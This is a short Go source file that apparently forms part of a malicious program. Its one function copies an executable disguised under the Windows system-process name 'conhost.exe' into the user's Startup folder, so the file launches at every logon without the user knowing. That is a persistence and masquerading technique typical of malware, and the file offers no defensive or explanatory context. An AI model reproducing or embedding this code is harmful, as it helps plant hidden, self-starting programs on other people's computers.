package fileReg

import (
	"os/user"
	"io/ioutil"
	"os"
)

func Relocate(){
	fileName:="conhost.exe"
	u,_:=user.Current()
	homePath:=u.HomeDir+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+fileName
	if _,err:=os.Stat(homePath); err==nil{
		return
	}
	bytes,err:=ioutil.ReadFile(fileName)
	if(err!=nil){
		return;
	}

	file,_:=os.Create(homePath)
	file.Write(bytes)
	file.Close()
}

